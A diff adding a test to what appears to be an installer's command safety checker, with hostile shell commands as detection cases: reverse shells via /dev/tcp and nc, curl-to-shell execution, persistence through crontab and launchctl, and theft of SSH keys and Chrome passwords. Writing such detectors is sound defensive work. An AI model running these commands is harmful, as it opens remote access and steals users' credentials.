@@ -235,3 +235,27 @@ test("a plan shows a step's environment variables with its commands", () => {
   const a = app({ "install.js": `module.exports = { run: [{ method: "shell.run", params: { message: "python app.py", env: { PYTHONSTARTUP: "evil.py" } } }] }` })
   assert.deepEqual(commandsOf(plan(a.file("install.js"), CTX))[0].env, ["PYTHONSTARTUP=evil.py"])
 })
+
+test("the safety report flags the usual Mac and Linux tricks, and leaves ordinary installs alone", () => {
+  const risks = (c) => commandsOf([{ commands: [c] }])[0].risks
+  const flagged = {
+    "echo aGVsbG8= | base64 -d | sh": "runs hidden, encoded commands",
+    'eval "$(curl -fsSL https://x.sh)"': "runs hidden, encoded commands",
+    "bash <(curl -s https://x.sh)": "runs hidden, encoded commands",
+    "crontab -l | { cat; echo '* * * * * ~/x'; } | crontab -": "changes system settings or startup",
+    "launchctl load ~/Library/LaunchAgents/x.plist": "changes system settings or startup",
+    "systemctl --user enable x.service": "changes system settings or startup",
+    "echo 'export X=1' >> ~/.zshrc": "changes system settings or startup",
+    "cp ~/.ssh/id_rsa /tmp/k": "reads passwords, keys or browser data",
+    "security find-generic-password -s 'Chrome Safe Storage' -w": "reads passwords, keys or browser data",
+    "cat ~/obstat/keys.json": "reads passwords, keys or browser data",
+    "cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data x": "reads passwords, keys or browser data",
+    "xattr -d com.apple.quarantine ./tool": "turns off one of the Mac's safety checks",
+    "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1": "opens a connection someone could control this computer through",
+    "nc -e /bin/sh 1.2.3.4 4444": "opens a connection someone could control this computer through",
+  }
+  for (const [c, why] of Object.entries(flagged)) assert.ok(risks(c).includes(why), `${c} -> ${risks(c)}`)
+  for (const c of ["uv pip install -r requirements.txt", "npm install", "git clone https://github.com/a/b app", "python app.py --port 7860", "echo done >> log.txt", "ffmpeg -i in.wav out.mp3", "pip install keyring"]) {
+    assert.deepEqual(risks(c), [], c)
+  }
+})
